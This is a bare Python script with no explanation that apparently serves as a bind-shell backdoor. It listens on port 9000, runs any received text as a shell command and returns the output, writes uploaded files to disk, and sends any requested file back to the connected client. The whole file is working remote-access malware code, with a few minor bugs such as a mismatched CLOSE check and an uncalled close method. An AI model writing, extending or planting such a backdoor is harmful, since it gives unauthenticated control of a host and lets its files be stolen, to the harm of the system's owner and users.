import socket,time,subprocess
import codecs

def upload(mysocket):
    mysocket.send(b"what is name of the file you are uploading?:\n")
    fname=codecs.decode(mysocket.recv(1024))
    mysocket.send(b"what unique string will end the transmission\n")
    endoffile = mysocket.recv(1024)
    print(endoffile)
    data=b""
    while not data.endswith(endoffile):
       data+= mysocket.recv(1024)
    try:
       print(len(endoffile))
       fh = open(fname.strip(),"wb")
       fh.write(bytes(codecs.decode(data[:-len(endoffile)],"base64")))
       fh.close
       print("ok")
    except Exception as e:
       print("no")

def download(mysocket):
	mysocket.send(b"what file do you want (including path)?:\n")
	fname=codecs.decode(mysocket.recv(1024))
	try:
   	    data=codecs.encode(open(fname.strip(),"rb").read(),"base64")
	except Exception as e:
   	    data="fails"
	mysocket.sendall(data+codecs.encode("!EOF!"))


mysocket=socket.socket()
mysocket.bind(("",9000))
mysocket.listen(1)
connection, address = mysocket.accept()
while True:
    time.sleep(1)
    print('Server connected by', address)

    try:
        command = codecs.decode(connection.recv(1024),"utf-8")

        if(command[:4]=="QUIT"):
              connection.send(codecs.encode("Terminating Connection.\n","utf-8"))
              break
        elif(command[:6]=="UPLOAD"):
              upload(connection)
              continue
        elif(command[:8]=="DOWNLOAD"):
              download(connection)
              continue
        elif(command[:8]=="CLOSE"):
              mysocket.listen(1)
              connection, address = mysocket.accept()
        elif len(command)!=0:
          	print(command)
          	p=subprocess.Popen(command ,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
          	results,errors = p.communicate()
          	results = results+errors
          	connection.send(results)

    except socket.error:
          print("no!!!!!!!!!!!!!!!")
          break
    
    except Exception as e:
          mysocket.send(codecs.encode(str(e),"utf-8"))
          break
    
